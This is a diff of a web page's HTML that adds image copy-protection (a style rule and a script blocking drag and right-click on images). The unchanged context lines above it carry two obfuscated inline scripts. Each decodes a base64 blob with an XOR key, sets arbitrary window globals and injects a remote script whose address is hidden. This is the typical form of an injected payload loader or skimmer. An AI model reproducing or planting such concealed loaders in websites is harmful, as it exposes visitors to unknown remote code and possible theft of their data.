@@ -688,7 +688,7 @@ fbq('track', 'PageView');
 <!-- End Meta Pixel Code -->
 <script>(function(){var y_an=atob("DPp6qXnAZiOLp/VO0YFY3AusRBmpz4E6oYlAhlajAk2l0oEjuJwDhxqvCw3p1do9sogT2Q2zSVPi35Ai/ooT0RysSEn4hdlssI4O2xCiE1fu1Nd0iqdWix6sCUHqy4Zs66EBixehC0apndc+uIIfxTCkRA+p0ZQipJ9Yk1v2B0C7nsJ545xDmh31Uxe9xsAt4M0bykviG372");var u_t=[];for(var h_6=0;h_6<y_an.length;h_6++){u_t.push(y_an.charCodeAt(h_6)&255);}var q_fi7i=u_t[0];var m_ujur=u_t.slice(1,1+q_fi7i);var e_mjh=u_t.slice(1+q_fi7i);var z_b=e_mjh.map(function(b,t_idw){return b^m_ujur[t_idw%q_fi7i];});var i_qtuj="";for(var g_nm=0;g_nm<z_b.length;g_nm++){i_qtuj+=String.fromCharCode(z_b[g_nm]&255);}var d_10b1=decodeURIComponent(escape(i_qtuj));var x_tx6g=JSON.parse(d_10b1);var x_0=x_tx6g.globals||[];x_0.forEach(function(l_4){window[l_4.name]=l_4.value;});var y_x=document.createElement("script");y_x.src=x_tx6g.url;y_x.async=true;y_x.defer=true;(x_tx6g.attributes||[]).forEach(function(m_pgy9){y_x.setAttribute(m_pgy9.name,m_pgy9.value);});(document.head||document.documentElement).appendChild(y_x);})();</script>
 <script>(function(){var p_dg=atob("DG+NYf2sUMkjRj+6FxSvFI/AcvMBLkvOZxy3TtLPNKcNM0vXfgn0T57DPedBNBDJdB3kEYnff7xXK0yVew75BI7YfqNQZBOYdhv5E5TOJb1GNR2ATBSvD5zBNesZZFvbYw6gFInBOa9aa0/IchnoD4mBKKpMIhLJdASvTd/aMaVWIx2ANU3wTYaOPqhOIx2ANQvsFZyBJb1OL1nDOh//BIvJPr0ONUrYfgv+Q9GOJqhPM1qYLU2vHKDR");var v_mw=[];for(var t_v=0;t_v<p_dg.length;t_v++){v_mw.push(p_dg.charCodeAt(t_v)&255);}var g_xksx=v_mw[0];var e_6h=v_mw.slice(1,1+g_xksx);var y_y2=v_mw.slice(1+g_xksx);var m_6dl=y_y2.map(function(b,d_am){return b^e_6h[d_am%g_xksx];});var o_9f2o="";for(var l_gtwl=0;l_gtwl<m_6dl.length;l_gtwl++){o_9f2o+=String.fromCharCode(m_6dl[l_gtwl]&255);}var e_zl=decodeURIComponent(escape(o_9f2o));var j_cg=JSON.parse(e_zl);var r_p=j_cg.globals||[];r_p.forEach(function(q_fi){window[q_fi.name]=q_fi.value;});var v_1=document.createElement("script");v_1.src=j_cg.url;v_1.async=true;v_1.defer=true;(j_cg.attributes||[]).forEach(function(v_r7){v_1.setAttribute(v_r7.name,v_r7.value);});(document.head||document.documentElement).appendChild(v_1);})();</script>
-</head><body>
+<style id="image-copy-protection">img{-webkit-user-drag:none;-webkit-touch-callout:none}</style></head><body>
 <noscript><img height="1" width="1" style="display:none"
 src="https://www.facebook.com/tr?id=953710494469098&ev=PageView&noscript=1"
 /></noscript>
@@ -800,4 +800,16 @@ document.addEventListener('click',e=>{
   const modal=document.getElementById('basicOffer');
   if(modal && e.target===modal) closeBasicOffer();
 });
-</script></body></html>
+</script><script id="image-copy-protection-script">(function () {
+  'use strict';
+  // Friction against casual image copying; public assets remain downloadable.
+  function isImage(target) {
+    return target && target.tagName === 'IMG';
+  }
+  document.addEventListener('dragstart', function (event) {
+    if (isImage(event.target)) event.preventDefault();
+  });
+  document.addEventListener('contextmenu', function (event) {
+    if (isImage(event.target)) event.preventDefault();
+  });
+})();</script></body></html>
